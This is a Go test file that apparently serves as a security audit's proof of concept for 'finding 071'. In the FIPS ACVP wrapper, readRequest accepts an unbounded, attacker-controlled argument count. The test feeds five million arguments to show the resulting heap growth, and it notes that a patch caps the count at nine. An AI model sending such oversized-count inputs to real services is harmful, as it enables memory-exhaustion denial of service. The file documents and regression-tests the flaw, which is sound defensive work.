// PoC for finding 071: readRequest accepts an attacker-controlled numArgs
// (32-bit little-endian word from the wrapper's stdin) without any upper
// bound, then passes it to readArgs which immediately allocates two slices
// of that length. A wrapper request with a large numArgs causes huge heap
// growth before any command lookup or per-command argument validation.
//
// Evidence: this PoC feeds numArgs = 5_000_000 followed by all-zero arg
// length words. readArgs returns 5_000_000 empty arg slices, proving no
// upper bound is enforced. readArgs allocates ~80MB of slice headers
// (5_000_000 * (8+16) bytes) plus 5_000_000 zero-length byte slices.
//
// We do not push the count into OOM territory on the host -- 5_000_000 is
// already orders of magnitude above any legitimate ACVP request, which
// uses at most 9 args (the patch caps numArgs at 9).

package fipstest

import (
	"bytes"
	"encoding/binary"
	"errors"
	"io"
	"runtime"
	"testing"
)

func TestPoCUnboundedRequestArgs(t *testing.T) {
	const numArgs uint32 = 5_000_000

	var buf bytes.Buffer
	if err := binary.Write(&buf, binary.LittleEndian, numArgs); err != nil {
		t.Fatal(err)
	}
	zeroLen := make([]byte, 4*numArgs)
	buf.Write(zeroLen)

	var ms0, ms1 runtime.MemStats
	runtime.ReadMemStats(&ms0)

	req, err := readRequest(&buf)
	if err != nil && !errors.Is(err, io.EOF) {
		t.Fatalf("readRequest unexpectedly errored: %v", err)
	}

	runtime.ReadMemStats(&ms1)

	if req == nil {
		t.Fatalf("readRequest returned nil request")
	}

	t.Logf("readRequest returned %d args (numArgs=%d) with no upper bound",
		len(req.args)+1, numArgs)
	t.Logf("approximate heap delta: %d bytes",
		int64(ms1.HeapAlloc)-int64(ms0.HeapAlloc))
	if uint32(len(req.args)+1) != numArgs {
		t.Fatalf("expected %d args parsed, got %d", numArgs, len(req.args)+1)
	}
	t.Log("BUG REPRODUCED: readRequest accepts an attacker-controlled numArgs")
	t.Log("without bounding it, allowing arbitrary heap growth before any")
	t.Log("command/argument validation. The patch caps numArgs at 9.")
}
